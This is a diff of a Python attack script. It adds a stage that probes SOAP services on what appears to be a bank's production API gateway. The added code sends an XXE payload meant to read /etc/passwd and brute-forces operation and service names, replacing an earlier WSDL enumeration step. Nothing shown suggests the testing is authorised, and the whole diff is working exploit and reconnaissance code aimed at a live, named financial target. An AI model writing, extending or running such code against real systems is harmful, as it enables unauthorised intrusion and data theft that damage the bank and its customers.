@@ -52,16 +52,39 @@ except Exception as e:
 
 
 
-print("== V9: AXIS2 SERVICES + WSDL ==")
-import re
-s, b = req("GET", "https://apigw-prod.bankina.id/services", {"User-Agent": "Mozilla/5.0"})
-print("SERVICES PAGE:", s, "len", len(b))
-links = re.findall(r'href="([^"]+)"', b)
-print("LINKS:", links[:40])
-for lk in links[:15]:
-    if lk.startswith("/") and "axis2" not in lk and "css" not in lk:
-        s2, b2 = req("GET", "https://apigw-prod.bankina.id" + lk + "?wsdl", {"User-Agent": "Mozilla/5.0"})
-        print("WSDL " + lk + " => " + str(s2) + " len " + str(len(b2)) + " | " + b2[:80])
-        if s2 == 200 and len(b2) > 100:
-            ops = re.findall(r'<wsdl:operation name="([^"]+)"', b2)
-            print("  OPERATIONS:", ops[:20])
+print("== V10: SOAP DISCOVERY + XXE ==")
+def soap_post(host, service, body, ctype="text/xml;charset=UTF-8"):
+    r = urllib.request.Request("https://" + host + "/services/" + service, data=body.encode(), method="POST",
+        headers={"Content-Type": ctype, "SOAPAction": "\"\"", "User-Agent": "Mozilla/5.0"})
+    try:
+        resp = urllib.request.urlopen(r, timeout=30, context=ctx)
+        return resp.status, resp.read()[:600].decode("utf-8", "ignore")
+    except urllib.error.HTTPError as e:
+        return e.code, e.read()[:600].decode("utf-8", "ignore")
+    except Exception as e:
+        return "ERR", str(e)[:120]
+
+ENV = '<?xml version="1.0"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body>{}</soapenv:Body></soapenv:Envelope>'
+
+# 1. generic body → fault reveals expected op
+s, b = soap_post("apigw-prod.bankina.id", "WorkflowCallbackService", ENV.format("<test/>"))
+print("WFC generic:", s, b[:400])
+
+# 2. echo service
+s, b = soap_post("apigw-prod.bankina.id", "echo", ENV.format("<echoString><in>hello</in></echoString>"))
+print("ECHO:", s, b[:300])
+
+# 3. XXE test di WorkflowCallbackService
+XXE = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><test>&xxe;</test></soapenv:Body></soapenv:Envelope>'
+s, b = soap_post("apigw-prod.bankina.id", "WorkflowCallbackService", XXE)
+print("XXE WFC:", s, b[:400])
+
+# 4. common op guessing
+for op in ["process", "callback", "notify", "handleResponse", "onEvent", "update", "complete", "receive", "submit"]:
+    s, b = soap_post("apigw-prod.bankina.id", "WorkflowCallbackService", ENV.format("<" + op + "/>"))
+    print("OP " + op + " => " + str(s) + " " + b[:120])
+
+# 5. service name guessing
+for svc in ["LoanService", "CicilanService", "WorkflowService", "CallbackService", "BinaService", "OnboardingService", "MasterDataService"]:
+    s, b = req("GET", "https://apigw-prod.bankina.id/services/" + svc, {"User-Agent": "Mozilla/5.0"})
+    print("SVC " + svc + " => " + str(s) + " " + b[:60])
